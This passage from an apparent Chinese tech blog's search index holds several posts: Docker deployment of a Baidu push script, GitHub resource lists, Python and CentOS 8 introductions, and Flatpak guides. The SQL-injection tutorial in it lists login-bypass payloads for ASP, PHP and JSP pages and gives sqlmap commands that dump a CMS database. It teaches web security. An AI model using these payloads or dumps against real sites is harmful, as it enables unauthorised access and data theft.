6092 100 30 100 6062 82 16671 --:--:-- --:--:-- --:--:-- 16653{"remain":98069,"success":138} Docker 一键部署推送服务 Dockerfile 的内容如下，构建生成 Docker 镜像后，使用命令直接启动 Docker 镜像即可。 使用命令直接启动 Docker 镜像时，需要通过 -v 参数将宿主机的 Python 脚本文件挂载到 Docker 容器内的 /usr/local/python_scripts/baidu_zhanzhang_push.py 位置。 123456789101112131415161718192021222324252627282930313233343536from augurproject/python2-and-3MAINTAINER clay&lt;656418510@qq.com&gt;RUN mkdir -p /tmp/baiduRUN touch /var/log/cron.logRUN mkdir -p /usr/local/python_scriptsENV workpath /usr/local/python_scriptsWORKDIR $workpathRUN echo "Asia/Shanghai" &gt; /etc/timezoneRUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimeRUN cp /etc/apt/sources.list /etc/apt/backup.sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN apt-get -y update &amp;&amp; apt-get -y upgradeRUN apt-get -y install python-rsa python-requests cron rsyslog vim htop net-tools telnet apt-utils tree wget curl git make gccRUN apt-get -y autoclean &amp;&amp; apt-get -y autoremoveRUN sed -i "s/#cron./cron./g" /etc/rsyslog.confRUN echo "0 */2 * * * root /usr/bin/python3 /usr/local/python_scripts/baidu_zhanzhang_push.py" &gt;&gt; /etc/crontabCMD service rsyslog start &amp;&amp; service cron start &amp;&amp; tail -f -n 20 /var/log/cron.log 若通过 Docker-Compose 来管理 Docker 镜像，那么 YML 配置文件的内容如下： 123456789101112version: \'3.5\'services: baidu-push: image: clay/baidu-push:1.0 container_name: hexo-baidu-push restart: always environment: TZ: \'Asia/Shanghai\' volumes: - /usr/local/baidu-push/logs:/tmp/baidu - /usr/local/baidu-push/baidu_zhanzhang_push.py:/usr/local/python_scripts/baidu_zhanzhang_push.py 数据卷挂载： /usr/local/baidu-push/logs：宿主机里的日志目录 /usr/local/baidu-push/baidu_zhanzhang_push.py：宿主机里 Python 脚本文件的路径 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"python"},{title:"GitHub 开源学习资料推荐",url:"/posts/7733a21f.html",text:'算法 项目名称 项目地址 说明 LeetCode 刷题攻略 https://github.com/youngyangyang04/leetcode-master 图解 LeetCode 算法 https://github.com/MisterBooo/LeetCodeAnimation Labuladong 的算法小抄 https://github.com/labuladong/fucking-algorithm 各种编程语言的算法实现 https://github.com/TheAlgorithms algorithm-base - 算法基础 https://github.com/chefyuan/algorithm-base 多种编程语言实现 LeetCode、《剑指 Offer（第 2 版）》、《程序员面试金典（第 6 版）》题解 https://github.com/doocs/leetcode C++ 项目名称 项目地址 说明 C/C++ 技术面试基础知识总结 https://github.com/huihut/interview Java 项目名称 项目地址 说明 Java 工程师成神之路 https://github.com/hollischuang/toBeTopJavaer 成为一个更好的 Java 程序员 https://github.com/crisxuan/bestJavaer 互联网公司常用 Java 框架源码赏析 https://github.com/doocs/source-code-hunter 互联网 Java 工程师进阶知识完全扫盲 https://github.com/doocs/advanced-java Java 实现各种设计模式 https://github.com/iluwatar/java-design-patterns Java 核心技术教程 https://github.com/dunwu/blog Spring 项目名称 项目地址 说明 Spring Cloud 学习资源 https://github.com/ityouknow/awesome-spring-cloud Spring Boot 专栏 - 涵盖 Spring Cloud、分布式消息队列、分布式事务等内容 https://github.com/YunaiV/SpringBoot-Labs GitHub 项目名称 项目地址 说明 GitHub 漫游指南 https://github.com/phodal/github 软件安全 项目名称 项目地址 说明 SpringBoot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 https://github.com/LandGrey/SpringBootVulExploit 容器技术 项目名称 项目地址 说明 Kubernetes 中文指南 / 云原生应用架构实践手册 https://github.com/rootsongjc/kubernetes-handbook 面试资料 项目名称 项目地址 说明 Java 面试小抄 https://github.com/cosen1024/Java-Interview Java 面试题整理 https://github.com/itdevbooks/tech Java 学习 + 面试指南 https://github.com/Snailclimb/JavaGuide 一款面试刷题的 Spring Cloud 开源系统 https://github.com/Jackson0714/PassJava-Platform 编程人生 项目名称 项目地址 说明 程序员如何优雅的挣零花钱 https://github.com/easychen/howto-make-more-money 程序员在体制内的工作和生活是怎样的 https://github.com/i0Ek3/work-and-life-in-system 电子书下载 项目名称 项目地址 说明 最新 1000 多本计算机电子书免费下载 https://github.com/itdevbooks/pdf 超过 1000 本的计算机经典书籍、个人笔记资料以及本人在各平台发表文章中所涉及的资源等 https://github.com/forthespada/CS-Books 经典编程书籍大全，涵盖：计算机系统与网络、系统架构、算法与数据结构、前后端开发等 https://github.com/imarvinle/awesome-cs-books 计算机类常用电子书，并且附带下载链接 https://github.com/cosen1024/awesome-cs-books 专门收集计算机领域经典书籍 https://github.com/Jackpopc/CS-Books-Store Java 程序员必读书单，超 1000 本 PDF 电子书 https://github.com/itwanger/JavaBooks table { width: fit-content; border-collapse: unset; } th, td { padding-left: 30px; padding-right: 30px; font-weight: normal; border-bottom: 1px solid #ddd; } var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开源项目"},{title:"Python 入门教程 - Python 介绍",url:"/posts/6bd46e8d.html",text:'Python 介绍Python 是一种解释型、面向对象的语言，编译后生成字节码文件 (.py 后缀)，运行在 PVM 虚拟机。Python 的创始人为吉多・范罗苏姆（Guido van Rossum），而 Python 是由 C 语言开发，但是不再有 C 语言中指针等复杂数据类型。 Python 的特点 语法简洁 可读性强 面向对象 免费和开源 丰富的库 (丰富的标准库，多种多样的扩展库) 可扩展性，方便嵌入到 C 和 C++ 语言，俗称胶水式语言 可移植性和跨平台，Python 会被编译成与操作系统相关的二进制代码，然后再解释执行。这种方式和 Java 类似，大大提高了执行速度，也实现了跨平台 Python 的应用范围 科学计算 人工智能 WEB 服务端和大型网站后端（如 YouTube、Gmail、豆瓣） 大数据 云计算 系统运维 GUI 开发 游戏开发 移动设备 嵌入式设备 Python 的解释器、编译器解析器的种类CPython（Clang）、JPython（Java）、IronPython（.Net）、PyPy（Python）。 解释器、编译器介绍计算机不能直接理解任何除机器语言以外的语言，所以必须要把程序员所写的程序语言翻译成机器语言，计算机才能执行程序。将其他语言翻译成机器语言的工具，被称为编译器，编译器翻译的方式有两种：一个是编译，另外一个是解释。两种方式之间的区别在于翻译时间点的不同。当编译器以解释方式运行的时候，也称之为解释器。 编译型语言：程序在执行之前需要一个专门的编译过程，把程序编译成为机器语言的文件，运行时不需要重新翻译，直接使用编译的结果就行了。程序执行效率高，依赖编译器，跨平台性差些。如 C、C++ 解释型语言：解释型语言编写的程序不进行预先编译，以文本方式存储程序代码，会将代码一句一句直接运行。在发布程序时，看起来省了道编译工序，但是在运行程序的时候，必须先解释再运行。 编译型语言和解释型语言对比：速度 — 编译型语言比解释型语言执行速度快；跨平台性 — 解释型语言比编译型语言跨平台性好。 Python 的缺点Python 是解释执行的语言，性能较低。因此，一些影响性能的功能可以使用 C/C++/JAVA/GO（GO 是 Google 的一门语言，写起来像 Python，性能像 C 语言）去开发，不过不用担心，Python 解释器会越来越快。 Python 的版本说明Python 的版本兼容 目前主要的两个版本 Python2.x: 2000 年 10 月发布，最新版本是 2.7，已经停止更新，2.7 被确定为最后一个 Python 2.x 版本，预计 2020 年退出历史舞台，解释器名称是 python Python3.x: 2008 年发布，Python3 有了较大的提升，不兼容 Python2，解释器名称是 python3 解决版本兼容问题 官方提供了一个过渡版本 Python 2.6，基本使用了 Python 2.x 的语法和库，同时考虑了向 Python 3.0 的迁移，允许使用部分 Python 3.0 的语法与函数 Python3 的很多新特性也被移植到了 Python2.7，如果程序可以在 2.7 运行，可以通过一个名为 2to3（Python 自带的一个脚本）的转换工具无缝迁移到 Python3 如果开发时，无法立即使用 Python 3.0（还有极少的第三方库不支持 3.0 的语法），建议先使用 Python 3.0 版本进行开发，然后使用 Python 2.6、Python 2.7 来运行，并且做一些兼容性的处理 Python 的多版本共存 第一种方法：使用 pyenv 进行版本管理 第二种方法：编译安装不同版本的 Python Python 集成开发环境IDLE 介绍 IDLE 是 Python 的官方标准开发环境，Windows 环境下 Python 安装完后默认就安装了 IDLE IDLE 是用纯 Python 基于 Tkinter 编写，最初的作者正是 Python 之父 Guido Van Rossum IDLE 已经具备了 Python 开发几乎所有功能 (语法智能提示、不同颜色显示不同类型等等)，也不需要其他配置，非常适合初学者使用 IDLE 是 Python 标准发行版内置的一个简单小巧的 IDE，包括了交互式命令行、编辑器、调试器等基本组件，足以应付大多数简单应用 常用集成开发环境 IDLE Pycharm wingIDE Eclipse IPython var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"python"},{title:"Centos8 新特性介绍",url:"/posts/e460e49c.html",text:'前言 CentOS 7 将在 2024 年 6 月 30 日停止支持。 发布时间 CentOS 8 在 2019.9.25 正式发布，提供了两个版本，分别是 CentOS 和 CentOS Streams，Linux 内核版本为 4.18。其中 CentOS Stream 是一个滚动发布的 Linux 发行版，它介于 Fedora Linux 的上游开发和 RHEL 的下游开发之间而存在。可以把 CentOS Streams 当成是用来体验最新红帽系 Linux 特性的一个版本，而无需等太久。CentOS 8 不支持 在 CentOS 7 的基础上进行大版本升级，因此 CentOS 8 只支持全新安装。截止 2020 年 12 月 9 日，CentOS 官方团队正式宣布 2021 年后将停止更新 CentOS 8，转而将更多的精力放在 CentOS Stream 上，也就是说以后不会再有 CentOS 9、CentOS 10，但 CentOS 7 的长期技术支持时间将不会改变，依旧会延续到 2024 年。 软件仓库 引入了两个新的软件仓库，分别是 BaseOS 和 AppStream，其中 BaseOS 包含所有底层 OS 包，AppStream 包含与应用程序相关的包、开发工具、数据库和其他包。换句话说，BaseOS 仓库拥有组成操作系统核心的传统 RPM 包。一旦你更新了系统，它会自动下载并安装这些包的任何新版本。然而有时候你可能不想批量升级软件，因为它可能会在你希望保持稳定的环境中导致兼容性问题（例如在测试代码时）。AppStream 是对传统 rpm 格式的全新扩展，为一个组件同时提供多个主要版本，这就是为什么新的 CentOS 8 新增了 AppStream 仓库。 软件更新 使用 YUM 包管理器 4.0.4 版本，该版本现在使用 DNF (Dandified YUM) 技术作为后端。DNF 是新一代的 YUM，且 CentOS 8 允许同时使用这 dnf 和 yum 两种工具来管理包。与 DNF 技术集成后，提高了性能，具有定义良好的 API，并支持模块化内容、云应用程序流、容器工作负载和 CI/CD。 Shell 和命令行工具 提供的版本控制工具，包括 Git 2.18，Mercurial 4.8 和 Subversion 1.10。 动态编程语言、Web 和数据库服务器 Python 3.6 是默认的 Python 环境，有限支持 Python 2.7。 Node.js 是在 CentOS 8 中最新包含的，其他动态语言更新包括: PHP 7.2，Ruby 2.5，Perl 5.26，SWIG 3.0。 提供的数据库服务，包括 MariaDB 10.3，MySQL 8.0，PostgreSQL 10，PostgreSQL 9.6，Redis 5。 提供 Apache 2.4 和首次引入 Nginx 1.14。 将 Squid 版本升级到 4.4，同时也首次提供 Varnish Cache 6.0。 编译器和开发工具 GCC 编译器更新到 8.2 版本，支持更多 C++ 标准，更好的优化以及代码增强技术、提升警告和硬件特性支持。 核心支持 eBPF 调试的工具包括 BCC、PCP 和 SystemTap。 2.28 版本 glibc 库支持 Unicode 11，更新的 Linux 系统调用功能主要提升 DNS Stub Resolver 和额外的安全加强和性能。 提供 OpenJDK 11、OpenJDK 8、IcedTea-Web 以及不同的 Java 工具，如 Ant、Maven、和 Scala。 桌面环境 GNOME Shell 升级到 3.28，GNOME 的会话和显示管理使用 Waylan 作为默认的显示服务器，而 CentOS 7 默认的 X.Org Server 依然支持。 安装程序以及镜像的创建 Anaconda 安装程序可使用 LUKS2 磁盘加密，支持 NVDIMM 设备。 Image Builder 工具可以创建不同格式的自定义系统镜像，包括满足云平台的各种格式。 支持使用硬件管理控制台 HMC 从 DVD 安装，同时也提供 IBM Z 主机的 Support Element (SE) 内核扩展 Berkeley Packet Filtering (eBPF) 特性使得用户空间的各个点上附加自定义程序，包括 (sockets, trace points, packet reception) ，用于接收和处理数据，目前该特性还处于特性预览阶段 BPF Compiler Collection (BCC), 这是一个用来创建高效内核跟踪和操作的工具，目前处于技术预览阶段 文件系统和存储 LUKS version 2（LUKS2）格式替代走过去的 LUKS (LUKS1) 格式，dm-crypt 子系统和 cryptsetup 工具现在使用的是 LUKS2 作为默认的加密卷格式。 加密安全 默认的系统级的加密策略用于配置核心加密子系统，覆盖 TLS、IPsec、SSH、DNSSEC 和 Kerberos 协议。增加全新命令 update-crypto-policies，管理员可轻松切换不同模式，包括 default、legacy、futurefips。 网络工具 nftables 框架替代 iptables 作为默认的网络包过滤工具。 firewalld 守护进程使用 nftables 作为默认后端。 支持 IPVLAN 虚拟网络驱动程序，主要用于连接多个容器。 虚拟化技术 使用 Podman 进行容器管理，在 CentOS 8 中创建的虚拟机，现在支持并自动配置更现代的基于 PCI Express 的计算机类型（Q35）。这在虚拟设备的功能和兼容性方面提供了多种改进。现在可以使用 RHEL8 Web 控制台（也称为 “驾驶舱”）创建和管理虚拟机。 高可用和集群 Pacemaker 集群资源管理器更新到最新版本 2.0.0，修复了一系列 bug 及相关功能做了提升。pcs 配置系统完全支持 Corosync 3、knet 和节点名称。 参考资料 CentOS 8 官方发行说明 完整的 RedHat 8 发行说明 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Web 安全之 SQL 注入",url:"/posts/74f2b358.html",text:'SQL 注入漏洞 语言有两种类型，分别是解释型语言和编译型语言。解释型语言是一种在运行时由一个运行时组件解释语言代码并执行其中包含的指令的语言。而编译型语言是代码在生成时转换为机器指令，然后在运行时直接由使用该语言的计算机执行这些指令。在解释型语言中，如果程序与用户进行交互，用户就可以构造特殊的输入来拼接到程序中执行，从而使得程序依据用户输入执行有可能存在恶意行为的代码。例如：在与用户交互的程序中，用户的输入拼接到 SQL 语句中，执行了与原定计划不同的行为，从而产生了 SQL 注入漏洞。 登录 SQL 语句：select * from admin where username = \'用户输入的用户名\' and password = \'用户输入的密码\'，此时用户输入的内容可由用户自行控制，例如可以输入 \' or 1=1 --空格 SQL 语句：select * from admin where username = \'\' or 1=1 -- \' and password = \'用户输入的密码\'，其中条件 or 1=1 永远为真，-- 注释后边的内容不再执行，因此 SQL 语句执行后会返回 admin 表中所有字段的内容 万能密码 万能密码是否有效，可以通过 Burp Suite 平台自行验证。 1234567891011121314151617181920212223242526ASP、ASPX万能密码：&nbsp;&nbsp; 1： "or "a"="a&nbsp;&nbsp;&nbsp;2： \')or(\'a\'=\'a&nbsp;&nbsp;&nbsp;3：or 1=1--&nbsp;&nbsp;&nbsp;4：\'or 1=1--&nbsp;&nbsp;&nbsp;5：a\'or\' 1=1--&nbsp;&nbsp;&nbsp;6： "or 1=1--&nbsp;&nbsp;&nbsp;7：\'or\'a\'=\'a&nbsp;&nbsp;&nbsp;8： "or"="a\'=\'a&nbsp;&nbsp;&nbsp;9：\'or\'\'=\'&nbsp;&nbsp;&nbsp;10：\'or\'=\'or\'&nbsp;&nbsp;&nbsp;11: 1 or \'1\'=\'1\'=1&nbsp;&nbsp;&nbsp;12: 1 or \'1\'=\'1\' or 1=1&nbsp;&nbsp;&nbsp;13: \'OR 1=1%00&nbsp;&nbsp;&nbsp;14: "or 1=1%00&nbsp;&nbsp;&nbsp;15: \'xorPHP万能密码：&nbsp;&nbsp;&nbsp;\'or\'=\'or\'&nbsp;&nbsp;&nbsp;\'or 1=1/*&nbsp;&nbsp;&nbsp; User: something，Password: \' OR \'1\'=\'1JSP万能密码：&nbsp;&nbsp;&nbsp;1\'or\'1\'=\'1&nbsp;&nbsp;&nbsp;admin\' OR 1=1/*&nbsp;&nbsp;&nbsp;User: admin Password: 1\'or\'1\'=\'1 CMS SQL 注入漏洞 CMS 逻辑：index.php 是首页，具有文章列表（链接包含文章 id），articles.php 是文章详细页，其 URL 为 articles.php?id=文章id SQL 注入验证： 当文章 id 为 单引号\'、and 1=1、and 1=2，若页面中出现 MySQL 的错误日志信息，或者页面不显示任何内容，则证明该页面存在 SQL 注入漏洞 SQLMap 探测命令： 1234探测数据库： sqlmap -u "192.168.1.104:8080/cms/articles.php?id=1" --dbs探测数据表： sqlmap -u "192.168.1.104:8080/cms/articles.php?id=1" -D cms --tables探测表字段： sqlmap -u "192.168.1.104:8080/cms/articles.php?id=1" -D cms -T articles --columns探测表字段值： sqlmap -u "192.168.1.104:8080/cms/articles.php?id=1" -D cms -T articles -C id,title,content --dump var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"网络安全"},{title:"Fedora30 构建 Flatpak 应用",url:"/posts/5bd408ba.html",text:'系统环境 12Fedora release 30 (Thirty)Linux Fedora30 3.10.0-1062.1.1.el7.x86_64 #1 SMP Fri Sep 13 22:55:44 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux Flatpak 安装 12345678910111213# 安装flatpak# yum install flatpak flatpak-builder# 添加flathub仓库# flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo# 添加GNOME稳定版的仓库（已失效）# wget https://sdk.gnome.org/keys/gnome-sdk.gpg# flatpak remote-add --gpg-import=gnome-sdk.gpg gnome https://sdk.gnome.org/repo/# flatpak remote-add --gpg-import=gnome-sdk.gpg --if-not-exists gnome-apps https://sdk.gnome.org/repo-apps/# 添加GNOME每日构建版的仓库（最新）# flatpak remote-add --if-not-exists gnome-nightly https://nightly.gnome.org/gnome-nightly.flatpakrepo 构建 Peek Peek 是一款 AUR 上人气很高的屏幕录像工具，可保存录像为 gif 动图和兼容于 html5 的 webm 视频，可以运行在 GNOME 桌面环境下。Peek 官方提供的源码里，默认包含了构建 Flatpak 应用的 YAML 文件，直接执行构建操作即可。构建 Peek 之前，需要保证 Flatpak 的版本 &gt;= 1.4.0，如果系统的 Flatpak 版本不满足要求，同时又不能升级 Flatpak 的版本，那么可参考本文最后给出的解决方案。 1234567891011121314151617181920212223242526# 查看flatpak的版本# flatpak --version# 下载源码# wget -O peek-1.4.0.tar.gz https://github.com/phw/peek/archive/1.4.0.tar.gz# 解压文件# tar -xvf peek-1.4.0.tar.gz# 进入构建目录# cd peek-1.4.0/data/flatpak/# 删除旧的应用文件# rm -rf *.flatpak# 安装运行时依赖gnome-platform-3.34（耗时较长），依赖flatpak的版本 &gt;= 1.4.0# flatpak install org.gnome.Sdk/x86_64/3.34# flatpak install org.gnome.Platform-3.34# 执行构建脚本# ./build.sh# 成功构建应用后，默认会生成".flatpakref"后缀的文件，例如：peek-stable.flatpakref# 安装构建生成应用# flatpak install xxxx.flatpakref 构建 Peek 的 YAML 文件 构建 Flatpak 应用离不开 YAML 配置文件，作用类似 Docker 的 docker-file，如果想自定义 Peek 的构建过程，可以参考下面 YAML 配置文件。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127app-id: com.uploadedlobster.peekruntime: org.gnome.Platformruntime-version: \'3.34\'sdk: org.gnome.Sdksdk-extensions: - org.freedesktop.Sdk.Extension.rust-stablebranch: stablecommand: peekfinish-args: - --share=ipc - --socket=x11 - --env=GDK_BACKEND=x11 - --socket=wayland - --talk-name=org.freedesktop.FileManager1 - --talk-name=org.gnome.Shell.Screencast - --filesystem=home - --filesystem=xdg-run/dconf - --filesystem=~/.config/dconf:ro - --talk-name=ca.desrt.dconf - --env=DCONF_USER_CONFIG_DIR=.config/dconf - --env=LD_LIBRARY_PATH=/app/libbuild-options: cflags: -O2 -g -fstack-protector-strong -D_FORTIFY_SOURCE=2 cxxflags: -O2 -g -fstack-protector-strong -D_FORTIFY_SOURCE=2 ldflags: -fstack-protector-strong -Wl,-z,relro,-z,now append-path: /usr/lib/sdk/rust-stable/bincleanup: - /include - /lib/pkgconfig - /share/gtk-doc - "*.la"modules: - name: ffmpeg config-opts: - --disable-debug - --disable-static - --enable-gpl - --enable-libvpx - --enable-libx264 - --enable-shared - --enable-libxcb - --enable-libxcb-xfixes - --disable-libxcb-shape - --disable-ffplay - --disable-ffprobe - --disable-doc - --disable-everything - --enable-bsf=vp9_superframe - --enable-decoder=libvpx_vp9 - --enable-decoder=png - --enable-decoder=rawvideo - --enable-encoder=apng - --enable-encoder=ffvhuff - --enable-encoder=gif - --enable-encoder=libvpx_vp9 - --enable-encoder=libx264 - --enable-encoder=png - --enable-demuxer=image2 - --enable-demuxer=matroska - --enable-muxer=apng - --enable-muxer=gif - --enable-muxer=image2 - --enable-muxer=mp4 - --enable-muxer=webm - --enable-filter=crop - --enable-filter=fps - --enable-filter=palettegen - --enable-filter=paletteuse - --enable-filter=scale - --enable-protocol=file - --enable-indev=xcbgrab sources: - type: archive url: https://ffmpeg.org/releases/ffmpeg-4.2.1.tar.xz sha256: cec7c87e9b60d174509e263ac4011b522385fd0775292e1670ecc1180c9bb6d4 modules: - name: yasm cleanup: "*" sources: - type: archive url: http://www.tortall.net/projects/yasm/releases/yasm-1.3.0.tar.gz sha256: 3dce6601b495f5b3d45b59f7d2492a340ee7e84b5beca17e48f862502bd5603f - name: libx264 config-opts: - --enable-pic - --enable-shared sources: - type: git url: https://git.videolan.org/git/x264.git commit: 72db437770fd1ce3961f624dd57a8e75ff65ae0b cleanup: - /bin/x264 - name: gifski buildsystem: simple build-options: build-args: - --share=network skip-arches: - aarch64 - arm sources: - type: archive url: https://github.com/ImageOptim/gifski/archive/0.9.1.tar.gz sha256: f39a6e510e825bf4b43aebd1d7fb581d3b59a11bf7521bf6f507d4b0fa684b76 build-commands: - cargo build --release --features=openmp --verbose - install -Dm755 target/release/gifski /app/bin/gifski - name: peek buildsystem: meson config-opts: - --buildtype=release build-options: cflags: -L/app/lib sources: - type: git url: ../.. branch: 1.4.0 modules: - name: keybinder3 sources: - type: archive url: https://github.com/kupferlauncher/keybinder/releases/download/keybinder-3.0-v0.3.2/keybinder-3.0-0.3.2.tar.gz sha256: e6e3de4e1f3b201814a956ab8f16dfc8a262db1937ff1eee4d855365398c6020© 2019 GitHub, Inc. 解决构建 Peek 时依赖 Flatpak 的版本必须大于 1.4.0 的问题 123# 更改YAML配置文件，指定org.gnome.Platform为其他低版本runtime: org.gnome.Platformruntime-version: \'3.32\' var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Centos7 下 Flatpak 的安装与使用",url:"/posts/61c6d2c8s.html",text:'Flatpak 介绍 Flatpak（前世为 xdg-app）是一种用于构建、分发、安装和运行应用程序的技术，类似的应用程序容器技术还有大名鼎鼎的 Snap、AppImage。它主要针对的是 Linux 桌面，通过在沙箱中隔离应用程序来提高 Linux 桌面的安全性，允许应用程序安装在任何 Linux 发行版上，而且支持用户在同一个系统中安装同一应用程序的多个版本。如果需要更多的 Flatpak 应用，可以从 Flathub 应用商店直接获取。 Flatpak 安装 12345678910111213# 安装flatpak# yum install flatpak flatpak-builder# 添加flathub仓库# flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo# 添加GNOME稳定版的仓库（已失效）# wget https://sdk.gnome.org/keys/gnome-sdk.gpg# flatpak remote-add --gpg-import=gnome-sdk.gpg gnome https://sdk.gnome.org/repo/# flatpak remote-add --gpg-import=gnome-sdk.gpg --if-not-exists gnome-apps https://sdk.gnome.org/repo-apps/# 添加GNOME每日构建版的仓库（最新）# flatpak remote-add --if-not-exists gnome-nightly https://nightly.gnome.org/gnome-nightly.flatpakrepo Flatpak 仓库管理命令 1234567891011121314# 查看仓库列表# flatpak remotes# 删除特定的仓库# flatpak remote-delete gnome-apps# 查看所有仓库的可用软件包列表（包括应用程序和运行时环境）# flatpak remote-ls | head -20# 查看所有仓库的应用程序列表# flatpak remote-ls --app# 查看特定仓库的应用程序列表# flatpak remote-ls gnome-apps --app Flatpak 应用管理命令 12345678910111213141516171819202122232425262728293031# 从特定的仓库安装应用程序（系统级安装-SystemWide）# flatpak install flathub com.leinardi.gwe# 从特定的仓库安装应用程序（用户级安装-PerUser）# flatpak install --user flathub com.leinardi.gwe# 运行已安装的应用程序# flatpak run com.leinardi.gwe# 查看已安装应用程序的详细信息# flatpak info com.leinardi.gwe# 查看已安装的软件包列表（包括应用程序和运行时环境）# flatpak list# 查看已安装的应用程序# flatpak list --app# 更新所有已安装的应用程序# flatpak update# 更新特定已安装的应用程序# flatpak update com.leinardi.gwe# 卸载特定的应用程序# flatpak uninstall com.leinardi.gwe# 离线安装（从Flathub下载应用程序的安装包，然后在本地离线安装，前提是系统已安装（或已包含）该应用程序所需的运行时环境）# flatpak install com.leinardi.gwe.flatpak# 提示：flatpak的命令，大多数都支持"--user"与"--system"参数，前者代表用户级的操作，后者代表系统级的操作，默认值为"--system" Flatpak 配置代理 若 Flatpak 的下载速度比较慢，此时可以配置 Flatpak 使用代理，以此加快下载速度。 123456# 添加环境变量# export http_proxy=http://127.0.0.1:8118# export https_proxy=http://127.0.0.1:8118# 测试代理# curl -I www.google.com 123# 移除环境变量# unset http_proxy# unset https_proxy Flatpak 相关目录说明 121. 普通用户运行Flatpak应用后自动生成的缓存目录为：~/.var/app2. 系统级安装Flatpak应用后，其应用的安装文件所在目录为：/var/lib/flatpak/app、/var/lib/flatpak/runtime 创建 Flatpak 应用的快捷方式 123456# 正常情况下安装Flatpak应用后，会自动创建快捷方式，如果没有则可以使用以下方法手动创建快捷方式# 创建应用com.leinardi.gwe（系统级安装）的快捷方式# ln -s 